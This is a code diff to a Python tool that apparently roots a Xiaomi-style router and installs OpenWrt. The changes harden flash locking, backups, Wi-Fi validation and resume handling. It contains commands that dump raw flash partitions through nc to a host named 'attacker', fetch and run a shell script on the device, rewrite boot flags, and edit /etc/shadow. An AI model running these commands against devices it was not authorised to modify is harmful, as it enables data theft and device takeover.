@@ -61,6 +61,8 @@ import hashlib
 import json
 import os
 import re
+import secrets
+import shlex
 import shutil
 import socket
 import subprocess
@@ -81,11 +83,12 @@ IMAGE_FLAVOURS = {"standard": "default", "nss": "nss"}
 # with the shell channel. The status file is what the driver polls.
 FLASH_SCRIPT = """\
 #!/bin/sh
-# Refuse to run twice. The launcher tries more than one way to detach, so a
-# strategy that turns out to have worked late must not start a second
-# ubiformat over a half-written UBI.
-if [ -e /tmp/rd03v2_flash.lock ]; then exit 0; fi
-: > /tmp/rd03v2_flash.lock
+if ! mkdir /tmp/rd03v2_flash.lock 2>/dev/null; then
+    echo fail:locked > /tmp/rd03v2_flash.status
+    exit 1
+fi
+echo $$ > /tmp/rd03v2_flash.lock/pid
+trap 'rm -rf /tmp/rd03v2_flash.lock' EXIT
 exec >/tmp/rd03v2_flash.log 2>&1
 echo running > /tmp/rd03v2_flash.status
 ubiformat /dev/mtd{target} -f {image} -y
@@ -268,18 +271,19 @@ def preflight(ch, rel, images, assume_yes, profile, destdir=None):
     return facts
 
 
-def backup(ch, sink, outdir, mtd, attacker, file_port, profile):
+def backup(ch, sink, outdir, mtd, attacker, file_port, profile, token):
     """Pull the partitions that are not reproducible if they are ever lost."""
     log("\n=== backup ===")
     got = {}
     for label, part in profile.backup_partitions:
         idx, size = mtd[part]["index"], mtd[part]["size"]
-        cmd = (f'({{ echo "FILE {label}.bin {size}"; '
+        cmd = (f'({{ echo "AUTH {token}"; echo "FILE {label}.bin {size}"; '
                f'dd if=/dev/mtd{idx} bs=65536 conv=noerror,sync 2>/dev/null; }} '
                f'| nc {attacker} {file_port}) >/dev/null 2>&1 &')
         ch.run(cmd, retries=0, quiet=True)
         name, path, n, want = sink.wait(timeout=300)
-        if path is None or n != want:
+        expected_name = f"{label}.bin"
+        if name != expected_name or path is None or n != want or want != size:
             raise Abort(f"backup of {part} failed ({n}/{want}) -- not proceeding")
         log(f"[b] {part} -> {label}.bin ({n} B)")
         got[label] = path
@@ -313,48 +317,78 @@ def expected_volume(ubi_path, itb_path):
     return blob, hashlib.md5(blob).hexdigest()
 
 
-def pivot(ch, http, facts, images, outdir, attacker, serve_port, assume_yes,
-          profile, wifi=False):
-    log("\n=== stage 2: pivot (writes the idle slot and the boot flags) ===")
-    target = facts["target_slot"]
-    tidx = facts["mtd"][target]["index"]
-    ubi_path = images["initramfs_ubi"]["path"]
-    itb_path = images["initramfs_itb"]["path"]
+def prepare_flash_job(ch, recover_stale_lock=False):
+    """Inspect a prior writer before touching either of its input files."""
+    rc, state = ch.run(
+        "s=$(cat /tmp/rd03v2_flash.status 2>/dev/null); "
+        "p=$(cat /tmp/rd03v2_flash.lock/pid 2>/dev/null); "
+        "a=0; [ -n \"$p\" ] && kill -0 \"$p\" 2>/dev/null && a=1; "
+        "printf 'status=%s pid=%s active=%s lock=%s' \"$s\" \"$p\" \"$a\" "
+        "\"$([ -d /tmp/rd03v2_flash.lock ] && echo 1 || echo 0)\"",
+        retries=0, quiet=True)
+    if "active=1" in state:
+        log(f"[2] existing ubiformat is active; waiting without touching inputs ({state})")
+        deadline = time.time() + 600
+        while time.time() < deadline:
+            time.sleep(5)
+            _rc, status = ch.run(
+                "cat /tmp/rd03v2_flash.status 2>/dev/null", quiet=True)
+            if status.startswith("done"):
+                return True
+            if status.startswith("fail"):
+                raise Abort(f"existing ubiformat failed: {status}")
+        raise Abort("existing ubiformat did not finish within 600 seconds")
+    if "status=done" in state:
+        return True
+    if "lock=1" in state or "status=fail" in state or "status=running" in state:
+        if not recover_stale_lock:
+            raise Abort(
+                f"stale/failed flash job state requires --recover-stale-lock "
+                f"after inspection ({state}); nothing was deleted or relaunched")
+        ch.run("rm -rf /tmp/rd03v2_flash.lock; "
+               "rm -f /tmp/rd03v2_flash.status", retries=0, quiet=True)
+        log(f"[2] explicitly cleared inactive stale flash state: {state}")
+    ch.run("rm -f /tmp/rd03v2_flash.status", retries=0, quiet=True)
+    return False
 
-    blob, want_md5 = expected_volume(ubi_path, itb_path)
-    log(f"[2] a correct write reads back {len(blob)} B, md5 {want_md5}")
 
+def perform_pivot_write(ch, http, ubi_path, outdir, attacker, serve_port,
+                        target, tidx, assume_yes, recover_stale_lock):
     confirm(f"write {os.path.basename(ubi_path)} to {target} (mtd{tidx}) and boot it?",
             assume_yes)
+    for key, value in (("boot_wait", "on"), ("uart_en", "1")):
+        rc, out = ch.run(f"nvram set {key}={value}", retries=0, quiet=True)
+        if rc != 0:
+            raise Abort(f"nvram set {key} failed: {out}")
+    rc, out = ch.run("nvram commit", retries=0, quiet=True)
+    if rc != 0:
+        raise Abort(f"nvram commit failed: {out}")
+    rescue = {key: nvram_get(ch, key) for key in ("boot_wait", "uart_en")}
+    if rescue != {"boot_wait": "on", "uart_en": "1"}:
+        raise Abort(f"UART rescue flags did not read back exactly: {rescue}")
+    log("[2] boot_wait=on uart_en=1 (UART rescue armed)")
 
-    # 1. insurance first: a U-Boot console costs nothing and is the only
-    #    rescue left for anyone who can hold pogo pins on the pads.
-    for k, v in (("boot_wait", "on"), ("uart_en", "1")):
-        ch.run(f"nvram set {k}={v}", retries=0, quiet=True)
-    ch.run("nvram commit", retries=0, quiet=True)
-    log(f"[2] boot_wait={nvram_get(ch, 'boot_wait')} "
-        f"uart_en={nvram_get(ch, 'uart_en')} (UART rescue armed)")
-
-    # 2. stage the image in tmpfs and prove it arrived intact
-    http.add("/initramfs.ubi", ubi_path)
+    initramfs_path = http.add("/initramfs.ubi", ubi_path)
     local_md5 = hashlib.md5(open(ubi_path, "rb").read()).hexdigest()
     ch.run(f"rm -f /tmp/ini.ubi; wget -q -O /tmp/ini.ubi "
-           f"http://{attacker}:{serve_port}/initramfs.ubi", timeout=300, retries=1)
+           f"http://{attacker}:{serve_port}{initramfs_path}", timeout=300,
+           retries=1)
     rc, out = ch.run("md5sum /tmp/ini.ubi", quiet=True)
     if local_md5 not in out:
         raise Abort(f"staged image md5 mismatch: {out!r} != {local_md5}")
     log(f"[2] image staged in /tmp, md5 {local_md5} verified on the device")
 
-    # 3. the write, detached: a torn ubiformat is the one thing that must not
-    #    happen because a socket blinked
-    http.add("/flash.sh", write_tmp(outdir, "flash.sh",
-             FLASH_SCRIPT.format(target=tidx, image="/tmp/ini.ubi")))
-    ch.run(f"wget -q -O /tmp/flash.sh http://{attacker}:{serve_port}/flash.sh",
+    flash_path = http.add(
+        "/flash.sh", write_tmp(
+            outdir, "flash.sh",
+            FLASH_SCRIPT.format(target=tidx, image="/tmp/ini.ubi")))
+    ch.run(f"wget -q -O /tmp/flash.sh http://{attacker}:{serve_port}{flash_path}",
            retries=1, quiet=True)
-    rc, _ = ch.run("test -s /tmp/flash.sh && chmod +x /tmp/flash.sh", retries=0, quiet=True)
+    rc, _ = ch.run("test -s /tmp/flash.sh && chmod +x /tmp/flash.sh",
+                   retries=0, quiet=True)
     if rc != 0:
         raise Abort("the flash script did not arrive on the device")
-    launch_detached(ch, tidx)
+    launch_detached(ch, tidx, recover_stale_lock)
 
     deadline = time.time() + 600
     status = ""
@@ -368,6 +402,25 @@ def pivot(ch, http, facts, images, outdir, attacker, serve_port, assume_yes,
         _rc, tail = ch.run("tail -20 /tmp/rd03v2_flash.log", quiet=True)
         raise Abort(f"ubiformat did not finish cleanly ({status!r}):\n{tail}")
     log("[2] ubiformat reported done")
+
+
+def pivot(ch, http, facts, images, outdir, attacker, serve_port, assume_yes,
+          profile, wifi=False, recover_stale_lock=False):
+    log("\n=== stage 2: pivot (writes the idle slot and the boot flags) ===")
+    target = facts["target_slot"]
+    tidx = facts["mtd"][target]["index"]
+    ubi_path = images["initramfs_ubi"]["path"]
+    itb_path = images["initramfs_itb"]["path"]
+
+    blob, want_md5 = expected_volume(ubi_path, itb_path)
+    log(f"[2] a correct write reads back {len(blob)} B, md5 {want_md5}")
+    reuse_write = prepare_flash_job(ch, recover_stale_lock)
+    if reuse_write:
+        log("[2] prior detached write completed; proceeding directly to readback")
+    else:
+        perform_pivot_write(
+            ch, http, ubi_path, outdir, attacker, serve_port, target, tidx,
+            assume_yes, recover_stale_lock)
 
     # 4. read it back before trusting it
     verify_written(ch, tidx, want_md5, len(blob))
@@ -386,21 +439,26 @@ def pivot(ch, http, facts, images, outdir, attacker, serve_port, assume_yes,
     # so from zero the RAM system gets six tries before the loader gives up and
     # returns to the slot stock is still sitting in.
     idx = profile.stock_slots[target]
-    for k, v in (("flag_try_sys1_failed", 0), ("flag_try_sys2_failed", 0),
-                 ("flag_last_success", idx), ("flag_boot_rootfs", idx)):
-        ch.run(f"nvram set {k}={v}", retries=0, quiet=True)
-    ch.run("nvram commit", retries=0, quiet=True)
+    wanted = {
+        "flag_try_sys1_failed": "0",
+        "flag_try_sys2_failed": "0",
+        "flag_last_success": str(idx),
+        "flag_boot_rootfs": str(idx),
+        "flag_ota_reboot": "0",
+    }
+    for key, value in wanted.items():
+        rc, out = ch.run(f"nvram set {key}={value}", retries=0, quiet=True)
+        if rc != 0:
+            raise Abort(f"nvram set {key} failed: {out}")
+    rc, out = ch.run("nvram commit", retries=0, quiet=True)
+    if rc != 0:
+        raise Abort(f"nvram commit failed: {out}")
 
-    got = {k: nvram_get(ch, k) for k in
-           ("flag_last_success", "flag_boot_rootfs", "flag_try_sys1_failed",
-            "flag_try_sys2_failed", "flag_ota_reboot")}
-    if got["flag_last_success"] != str(idx):
-        raise Abort(f"flag_last_success read back as {got['flag_last_success']!r}, "
-                    f"wanted {idx} -- the boot pointer did not move, do not reboot")
-    if got["flag_ota_reboot"] not in ("", "0"):
-        # The OTA branch of the chooser ignores the normal path entirely.
-        raise Abort(f"flag_ota_reboot={got['flag_ota_reboot']!r}; clear it before "
-                    "pivoting or the chooser takes its OTA path instead")
+    got = {key: nvram_get(ch, key) for key in wanted}
+    mismatched = {key: (value, got[key]) for key, value in wanted.items()
+                  if got[key] != value}
+    if mismatched:
+        raise Abort(f"boot flags did not read back exactly: {mismatched}")
     log(f"[2] flag_last_success={got['flag_last_success']} ({target}), "
         f"counters {got['flag_try_sys1_failed']}/{got['flag_try_sys2_failed']} "
         "-- six attempts before the loader falls back to "
@@ -417,7 +475,7 @@ def pivot(ch, http, facts, images, outdir, attacker, serve_port, assume_yes,
         "bootloader falls back to it")
 
 
-def launch_detached(ch, tidx):
+def launch_detached(ch, tidx, recover_stale_lock=False):
     """Start the flash script off the command channel, and prove it started.
 
     The proving is the point. The script writes its status file as its first
@@ -425,8 +483,27 @@ def launch_detached(ch, tidx):
     running -- and silently polling an empty status for ten minutes, which is
     what the first version of this did, is indistinguishable from a slow write.
     """
-    ch.run("rm -f /tmp/rd03v2_flash.status /tmp/rd03v2_flash.lock",
-           retries=0, quiet=True)
+    rc, state = ch.run(
+        "s=$(cat /tmp/rd03v2_flash.status 2>/dev/null); "
+        "p=$(cat /tmp/rd03v2_flash.lock/pid 2>/dev/null); "
+        "a=0; [ -n \"$p\" ] && kill -0 \"$p\" 2>/dev/null && a=1; "
+        "printf 'status=%s pid=%s active=%s lock=%s' \"$s\" \"$p\" \"$a\" "
+        "\"$([ -d /tmp/rd03v2_flash.lock ] && echo 1 || echo 0)\"",
+        retries=0, quiet=True)
+    if "status=done" in state:
+        log("[2] prior detached write reports done; reusing it for readback")
+        return "existing-complete"
+    if "active=1" in state:
+        raise Abort(f"a detached ubiformat is still running ({state})")
+    if "lock=1" in state or "status=fail" in state or "status=running" in state:
+        if not recover_stale_lock:
+            raise Abort(
+                f"stale/failed flash job state requires --recover-stale-lock "
+                f"after inspection ({state}); nothing was deleted or relaunched")
+        ch.run("rm -rf /tmp/rd03v2_flash.lock; "
+               "rm -f /tmp/rd03v2_flash.status", retries=0, quiet=True)
+        log(f"[2] explicitly cleared inactive stale flash state: {state}")
+    ch.run("rm -f /tmp/rd03v2_flash.status", retries=0, quiet=True)
     for name, cmd in DETACH_STRATEGIES:
         rc, out = ch.run(f"{cmd}; echo rc=$?", retries=0, quiet=True)
         started = "rc=0" in out
@@ -439,6 +516,10 @@ def launch_detached(ch, tidx):
                 log(f"[2] ubiformat running detached on mtd{tidx} (via {name})")
                 return name
         log(f"[2] {name} did not start it{'' if started else ' (and reported failure)'}")
+        if started:
+            raise Abort(
+                f"{name} reported success but no status appeared; refusing to "
+                "try another launcher while the first may still start")
     raise Abort(
         "could not start the flash script detached by any available means "
         f"({', '.join(n for n, _ in DETACH_STRATEGIES)}). Nothing has been "
@@ -473,6 +554,7 @@ def write_tmp(outdir, name, text):
     path = os.path.join(outdir, name)
     with open(path, "w") as fh:
         fh.write(text)
+    os.chmod(path, 0o600)
     return path
 
 
@@ -492,6 +574,10 @@ def write_tmp(outdir, name, text):
 # uci-defaults -- so it waits, and generates the config itself if nothing has.
 FIRSTBOOT = """\
 #!/bin/sh
+{wireless}{rootpw}exit 0
+"""
+
+FIRSTBOOT_WIRELESS = """\
 [ -s /etc/config/wireless ] || /sbin/wifi config >/dev/null 2>&1
 i=0
 while [ $i -lt 20 ]; do
@@ -512,8 +598,6 @@ for vif in $(uci -q show wireless | sed -n \
     uci -q set wireless.$vif.key={key}
 done
 uci -q commit wireless
-{rootpw}
-exit 0
 """
 
 
@@ -532,27 +616,33 @@ def build_config_tar(path, ssid, key, profile, country=None, pwhash=None):
     """
     import io
     import tarfile
-    cy = f"    uci -q set wireless.$dev.country={_sq(country)}\n" if country else ""
+    wireless = ""
+    if ssid:
+        cy = (f"    uci -q set wireless.$dev.country={_sq(country)}\n"
+              if country else "")
+        wireless = FIRSTBOOT_WIRELESS.format(
+            ssid=_sq(ssid), key=_sq(key), country=cy)
     pw = ""
     if pwhash:
         # sed rather than shipping /etc/shadow: replacing the whole file would
         # drop every other account the image defines.
         pw = (f"sed -i 's|^root:[^:]*:|root:{pwhash}:|' /etc/shadow\n")
-    body = FIRSTBOOT.format(ssid=_sq(ssid), key=_sq(key),
-                            country=cy, rootpw=pw).encode()
+    body = FIRSTBOOT.format(wireless=wireless, rootpw=pw).encode()
 
     with tarfile.open(path, "w:gz") as tf:
         info = tarfile.TarInfo(f"etc/uci-defaults/{profile.firstboot_script}")
         info.size = len(body)
         info.mode = 0o755
         tf.addfile(info, io.BytesIO(body))
+    os.chmod(path, 0o600)
     return path
 
 
 def password_hash(plain):
     """SHA-512 crypt, via openssl -- python's crypt module is gone in 3.13."""
-    r = subprocess.run(["openssl", "passwd", "-6", plain],
-                       capture_output=True, text=True, timeout=30)
+    r = subprocess.run(["openssl", "passwd", "-6", "-stdin"],
+                       input=plain + "\n", capture_output=True, text=True,
+                       timeout=30)
     if r.returncode != 0 or not r.stdout.strip().startswith("$6$"):
         raise Abort(f"could not hash the root password: {r.stderr.strip()}")
     return r.stdout.strip()
@@ -587,7 +677,16 @@ def ssh_banner(host, timeout=10):
             with socket.socket(family, stype, proto) as s:
                 s.settimeout(timeout)
                 s.connect(addr)
-                return s.recv(256).decode("ascii", "replace").strip(), None
+                line = b""
+                while not line.endswith(b"\n") and len(line) < 255:
+                    chunk = s.recv(1)
+                    if not chunk:
+                        break
+                    line += chunk
+                banner = line.rstrip(b"\r\n").decode("ascii", "replace")
+                if not banner.startswith("SSH-"):
+                    return None, f"invalid SSH identification from {host!r}"
+                return banner, None
         except OSError as e:
             last = e
     return None, f"nothing answering ssh on {host}: {last}"
@@ -773,7 +872,38 @@ def wait_for_openwrt(host, deadline_s=420):
     return False
 
 
-def flash(host, images, assume_yes, profile, cfg_tar=None):
+def require_permanent_nand_support(raw_flash_type, rel, profile, image_cache):
+    ft = release.normalise_flash_type(raw_flash_type)
+    part = profile.flash_types.get(ft)
+    ok, why = release.check_nand(rel, part, image_cache, flash_type=ft)
+    if not ok:
+        raise Abort(why)
+    return ft, part, why
+
+
+def permanent_system_matches(profile, board, rootfs_type, mtd_text):
+    mtd = parse_mtd(mtd_text)
+    partitions_ok = all(
+        name in mtd and mtd[name]["size"] == size
+        for name, (_start, size) in profile.openwrt_partitions.items())
+    return (board.strip() == profile.openwrt_board
+            and rootfs_type.strip() == "overlay" and partitions_ok)
+
+
+def build_sysupgrade_launcher(opts):
+    return ("#!/bin/sh\n"
+            "echo started > /tmp/xiaomi-sysupgrade.status\n"
+            "i=0\n"
+            "while [ ! -e /tmp/xiaomi-sysupgrade.ack ] && [ $i -lt 120 ]; do\n"
+            "  i=$((i+1)); sleep 1\n"
+            "done\n"
+            "[ -e /tmp/xiaomi-sysupgrade.ack ] || { "
+            "echo fail:no-ack > /tmp/xiaomi-sysupgrade.status; exit 1; }\n"
+            "echo acknowledged > /tmp/xiaomi-sysupgrade.status\n"
+            f"exec /sbin/sysupgrade {opts or '-n '}/tmp/fw.bin\n")
+
+
+def flash(host, rel, images, assume_yes, profile, image_cache, cfg_tar=None):
     log("\n=== stage 3: flash (sysupgrade from the RAM system) ===")
     if not wait_for_openwrt(host):
         raise Abort(
@@ -800,6 +930,14 @@ def flash(host, images, assume_yes, profile, cfg_tar=None):
     log(f"[3] OpenWrt sees {len(mtd)} partitions incl. "
         f"{[p for p in mtd if p in ('ubi_kernel', 'rootfs')]}")
     log("[3] the NAND probed under OpenWrt -- the flash chip is supported")
+
+    rc, raw_ft = ssh(host, "fw_printenv -n flash_type 2>/dev/null", check=False)
+    if rc != 0 or not raw_ft.strip():
+        rc, raw_ft = ssh(host, "fw_printenv flash_type 2>/dev/null", check=False)
+        raw_ft = raw_ft.split("=", 1)[-1] if "=" in raw_ft else ""
+    ft, part, why = require_permanent_nand_support(
+        raw_ft, rel, profile, image_cache)
+    log(f"[3] permanent-image NAND gate: PASS -- {why}")
 
     img = images["sysupgrade"]
     confirm(f"write {img['name']} to NAND? This is the point of no return.",
@@ -828,52 +966,59 @@ def flash(host, images, assume_yes, profile, cfg_tar=None):
     # kernel UBI the stock bootloader cannot attach.
     # -f wins over -n in sysupgrade (it forces SAVE_CONFIG=1 and uses the given
     # archive), so the two are not combined.
-    rc, out = ssh(host, "start-stop-daemon -S -b -x /sbin/sysupgrade -- "
-                        f"{opts or '-n '}/tmp/fw.bin; echo rc=$?",
-                  timeout=60, check=False)
+    import tempfile
+    script_body = build_sysupgrade_launcher(opts)
+    with tempfile.TemporaryDirectory() as tmp:
+        launcher = os.path.join(tmp, "run-sysupgrade.sh")
+        with open(launcher, "w") as output:
+            output.write(script_body)
+        scp_to(host, launcher, "/tmp/run-sysupgrade.sh")
+    rc, active_upgrade = ssh(
+        host, "pgrep -f '[s]ysupgrade' | head -1", check=False)
+    if rc == 0 and active_upgrade.strip():
+        raise Abort(f"sysupgrade is already running (pid {active_upgrade.strip()})")
+    ssh(host, "chmod 700 /tmp/run-sysupgrade.sh; "
+              "rm -f /tmp/xiaomi-sysupgrade.status /tmp/xiaomi-sysupgrade.ack",
+        check=True)
+    rc, out = ssh(
+        host,
+        "start-stop-daemon -S -b -x /tmp/run-sysupgrade.sh; rc=$?; "
+        "i=0; while [ $i -lt 10 ]; do "
+        "s=$(cat /tmp/xiaomi-sysupgrade.status 2>/dev/null); "
+        "[ -n \"$s\" ] && break; i=$((i+1)); sleep 1; done; "
+        "printf 'rc=%s status=%s\\n' \"$rc\" \"$s\"",
+        timeout=30, check=False)
     log(f"[3] launch: {out.strip() or 'no output'}")
-
-    # ...and then prove it started. Issuing the command is not evidence: the
-    # same `start-stop-daemon -S` that silently refused during the pivot fails
-    # by printing and exiting 1, and with check=False that reads exactly like
-    # success. Once the radios go down there is no channel left to find out,
-    # so it has to be established here, in the seconds we still have.
-    started = False
-    for _ in range(12):
-        time.sleep(5)
-        rc, out = ssh(host, "pgrep -f '[s]ysupgrade' | head -3", timeout=20,
-                      check=False)
-        if rc != 0:
-            # ssh itself has gone: sysupgrade stops services early, so losing
-            # the session here is itself evidence that something is running.
-            log("[3] the session dropped -- consistent with sysupgrade having "
-                "taken the system down; no further observation is possible "
-                "over this link")
-            started = True
-            break
-        if out.strip():
-            log(f"[3] sysupgrade is running (pid {out.split()[0]})")
-            started = True
-            break
-    if not started:
+    if "rc=0" not in out or "status=started" not in out:
         raise Abort(
-            "sysupgrade did not start and the system is still up. Nothing has "
-            "been written -- /proc/mtd is unchanged and the RAM system is "
-            "intact, so this is safe to diagnose and retry.")
+            "sysupgrade start marker was not observed. Do not power-cycle; "
+            "inspect the RAM system before retrying.")
+    log("[3] durable sysupgrade start marker observed")
+    rc, ack = ssh(host, "touch /tmp/xiaomi-sysupgrade.ack; echo ack-sent",
+                  timeout=10, check=False)
+    if rc != 0 or "ack-sent" not in ack:
+        raise Abort("could not acknowledge sysupgrade start; it will time out "
+                    "without writing")
     log("[3] do not touch the power")
     log("[3] it reformats both UBIs, writes kernel+rootfs, sets the boot flags "
         "and reboots")
 
-    time.sleep(90)
-    if wait_for_openwrt(host, 600):
-        _rc, out = ssh(host, ". /lib/upgrade/common.sh; rootfs_type; "
-                             "cat /proc/mtd | head -3; uname -a", check=False)
-        log(f"[3] back up:\n{out}")
-        log("[+] OpenWrt is installed on NAND.")
-    else:
-        log("[!] did not come back within 10 minutes. A single 'UBI init error "
-            "22' on the first boot is normal and self-heals; a loop is not. "
-            "Power-cycle once before assuming the worst.")
+    time.sleep(60)
+    deadline = time.time() + 600
+    while time.time() < deadline:
+        if not wait_for_openwrt(host, 30):
+            continue
+        _rc, board2 = ssh(host, ". /lib/functions.sh; board_name", check=False)
+        _rc, rtype2 = ssh(host, ". /lib/upgrade/common.sh; rootfs_type", check=False)
+        _rc, mtd2_text = ssh(host, "cat /proc/mtd", check=False)
+        if permanent_system_matches(profile, board2, rtype2, mtd2_text):
+            log(f"[3] installed board={board2.strip()} rootfs_type=overlay")
+            log("[+] OpenWrt is installed on NAND.")
+            return
+        log(f"[3] system is up but not the permanent target yet: "
+            f"board={board2.strip()!r} rootfs={rtype2.strip()!r}")
+        time.sleep(10)
+    raise Abort("OpenWrt did not return as the expected permanent overlay system")
 
 
 # ---- driver -----------------------------------------------------------------
@@ -933,6 +1078,11 @@ def parse_args(argv=None):
     ap.add_argument("--skip-init", action="store_true", help=hidden)
     ap.add_argument("--skip-exploit", action="store_true", help=hidden)
     ap.add_argument("--settle", type=int, default=90, help=hidden)
+    ap.add_argument("--session-token", default=None, help=hidden)
+    ap.add_argument("--resume-manifest", default=None, help=hidden)
+    ap.add_argument("--standalone-flash", action="store_true", help=hidden)
+    ap.add_argument("--recover-stale-lock", action="store_true", help=hidden)
+    ap.add_argument("--config-tar", default=None, help=hidden)
     args = ap.parse_args(argv)
 
     legacy_image = {"default": "standard", "nss": "nss"}.get(args.flavour)
@@ -959,7 +1109,7 @@ def prompt_firstboot(args):
     """Collect optional installed-system settings without a long command line."""
     if not sys.stdin.isatty():
         raise Abort("--configure needs an interactive terminal")
-    print("\nInstalled-system configuration (press Enter to leave an item unset)")
+    print("\nInstalled-system configuration (root password and SSID may be blank)")
     if args.root_password is None:
         args.root_password = getpass.getpass("OpenWrt root password: ") or None
     if args.wifi_ssid is None:
@@ -968,27 +1118,128 @@ def prompt_firstboot(args):
         if args.wifi_key is None:
             args.wifi_key = getpass.getpass("OpenWrt Wi-Fi password: ")
         if args.wifi_country is None:
-            args.wifi_country = input("Wi-Fi country code (for example BR): ").strip().upper()
+            args.wifi_country = input(
+                "Wi-Fi country code (required when SSID is set, for example BR): "
+            ).strip().upper()
     return args
 
 
+def validate_firstboot_config(ssid, key, country):
+    """Validate values against hostapd/WPA limits before any device change."""
+    if not ssid:
+        if key or country:
+            raise Abort("--wifi-key/--wifi-country require --wifi-ssid")
+        return
+    if any(ord(ch) < 32 or ord(ch) == 127 for ch in ssid):
+        raise Abort("Wi-Fi SSID must not contain control characters")
+    if not 1 <= len(ssid.encode("utf-8")) <= 32:
+        raise Abort("Wi-Fi SSID must be 1-32 UTF-8 bytes")
+    try:
+        key_bytes = (key or "").encode("ascii")
+    except UnicodeEncodeError:
+        raise Abort("WPA2 passphrase must contain printable ASCII characters")
+    if not 8 <= len(key_bytes) <= 63 or any(b < 32 or b > 126 for b in key_bytes):
+        raise Abort("WPA2 passphrase must be 8-63 printable ASCII characters")
+    if not country or not re.fullmatch(r"[A-Z]{2}", country):
+        raise Abort("Wi-Fi country must be a two-letter uppercase code")
+
+
+def load_resume_manifest(path):
+    try:
+        with open(path) as source:
+            data = json.load(source)
+    except (OSError, json.JSONDecodeError) as exc:
+        raise Abort(f"cannot read resume manifest {path}: {exc}")
+    if data.get("version") != 1:
+        raise Abort(f"unsupported resume manifest version in {path}")
+    return data
+
+
+def write_resume_manifest(path, args, profile, rel, images, token, cfg_tar):
+    data = {
+        "version": 1,
+        "phase": "prepared",
+        "profile": profile.slug,
+        "release": rel.tag,
+        "image": args.image,
+        "flavour": args.flavour,
+        "transport": args.transport,
+        "interface": args.discover,
+        "images_dir": os.path.abspath(args.images),
+        "images": {kind: {"name": item["name"], "sha256": item["sha256"]}
+                   for kind, item in images.items()},
+        "session_token": token,
+        "config_tar": os.path.abspath(cfg_tar) if cfg_tar else None,
+        "root_password_set": bool(args.root_password),
+    }
+    tmp = path + ".tmp"
+    with open(tmp, "w") as output:
+        json.dump(data, output, indent=2, sort_keys=True)
+        output.write("\n")
+    os.chmod(tmp, 0o600)
+    os.replace(tmp, path)
+    return data
+
+
+def update_resume_phase(path, phase):
+    data = load_resume_manifest(path)
+    data["phase"] = phase
+    tmp = path + ".tmp"
+    with open(tmp, "w") as output:
+        json.dump(data, output, indent=2, sort_keys=True)
+        output.write("\n")
+    os.chmod(tmp, 0o600)
+    os.replace(tmp, path)
+    return data
+
+
+def verify_resume_selection(resume, args, profile, rel, images):
+    expected = {
+        "profile": profile.slug,
+        "release": rel.tag,
+        "image": args.image,
+        "flavour": args.flavour,
+        "transport": args.transport,
+    }
+    mismatched = {key: (resume.get(key), value) for key, value in expected.items()
+                  if resume.get(key) != value}
+    for kind, item in images.items():
+        recorded = (resume.get("images") or {}).get(kind) or {}
+        if recorded.get("name") != item["name"] or recorded.get("sha256") != item["sha256"]:
+            mismatched[f"images.{kind}"] = (recorded, {
+                "name": item["name"], "sha256": item["sha256"]})
+    if mismatched:
+        raise Abort(f"resume manifest does not match selected install: {mismatched}")
+
+
 def main(argv=None):
+    os.umask(0o077)
     args = parse_args(argv)
+    resume = load_resume_manifest(args.resume_manifest) if args.resume_manifest else None
+    if resume:
+        args.device = resume["profile"]
+        args.tag = resume["release"]
+        args.image = resume["image"]
+        args.flavour = resume["flavour"]
+        args.transport = resume["transport"]
+        args.discover = resume.get("interface")
+        args.images = resume["images_dir"]
+        args.session_token = resume["session_token"]
+        args.config_tar = resume.get("config_tar")
+        args.configure = False
     if args.configure and not args.dry_run:
         prompt_firstboot(args)
     profile = devices.get_profile(args.device)
     args.host = args.host or profile.stock_host
     args.openwrt_host = args.openwrt_host or profile.openwrt_host
 
-    cfg_tar = None
-    if args.wifi_ssid or args.root_password:
-        if args.wifi_ssid and not (args.wifi_key and 8 <= len(args.wifi_key) <= 63):
-            raise Abort("--wifi-key must be 8-63 characters for WPA2")
-        if args.wifi_ssid and not args.wifi_country:
-            log("[!] no --wifi-country: the radios will run under the world "
-                "regulatory domain. Set it to your country.")
-    outdir = args.outdir or f"install-{time.strftime('%Y%m%d-%H%M%S')}"
-    os.makedirs(outdir, exist_ok=True)
+    cfg_tar = args.config_tar
+    validate_firstboot_config(args.wifi_ssid, args.wifi_key, args.wifi_country)
+    outdir = (args.outdir or (os.path.dirname(os.path.abspath(args.resume_manifest))
+                              if args.resume_manifest else None)
+              or f"install-{time.strftime('%Y%m%d-%H%M%S')}")
+    os.makedirs(outdir, mode=0o700, exist_ok=True)
+    os.chmod(outdir, 0o700)
     chain.set_log_sink(open(f"{outdir}/transcript.log", "w"))
     log(f"[*] output -> {outdir}/")
 
@@ -1011,9 +1262,16 @@ def main(argv=None):
     via = f" via {args.discover}" if args.discover else ""
     log(f"[*] transport: {args.transport}{via}")
 
+    if (resume and resume.get("root_password_set") and args.stage == "flash"
+            and not args.root_password):
+        if not sys.stdin.isatty():
+            raise Abort("resumed flash needs the configured root password for "
+                        "post-install verification; rerun in a terminal")
+        args.root_password = getpass.getpass(
+            "OpenWrt root password used by the original run: ")
     if args.root_password:
         SSH_PASSWORDS.append(args.root_password)
-    if args.wifi_ssid or args.root_password:
+    if not cfg_tar and (args.wifi_ssid or args.root_password):
         cfg_tar = build_config_tar(
             f"{outdir}/firstboot.tar.gz", args.wifi_ssid or "", args.wifi_key or "",
             profile,
@@ -1052,6 +1310,33 @@ def main(argv=None):
     log(f"[*] initramfs: {'beaconing (-wifi)' if wifi else 'radio-silent'}")
     images = release.get_images(rel, args.images, args.flavour, kinds, wifi=wifi)
 
+    token = args.session_token or secrets.token_hex(16)
+    if args.skip_exploit and not (args.session_token or resume):
+        raise Abort("--skip-exploit requires --resume-manifest or the original "
+                    "--session-token")
+    if resume:
+        verify_resume_selection(resume, args, profile, rel, images)
+        if cfg_tar and not os.path.isfile(cfg_tar):
+            raise Abort(f"resume config archive is missing: {cfg_tar}")
+        phase = resume.get("phase")
+        allowed = {
+            "preflight": ("prepared", "preflight-complete"),
+            "pivot": ("prepared", "preflight-complete"),
+            "flash": ("pivot-complete",),
+            "all": ("prepared", "preflight-complete"),
+        }[args.stage]
+        if phase not in allowed:
+            raise Abort(f"resume phase {phase!r} is not valid for stage {args.stage!r}")
+        if phase == "preflight-complete" and args.stage in ("pivot", "all"):
+            args.skip_exploit = True
+    elif args.stage == "flash" and not args.standalone_flash:
+        raise Abort("direct --stage flash requires --resume-manifest; use "
+                    "--standalone-flash only for a separately validated RAM boot")
+    manifest_path = args.resume_manifest or os.path.join(outdir, "resume.json")
+    if not resume and not args.dry_run:
+        resume = write_resume_manifest(
+            manifest_path, args, profile, rel, images, token, cfg_tar)
+
     if args.dry_run:
         blob, want_md5 = expected_volume(
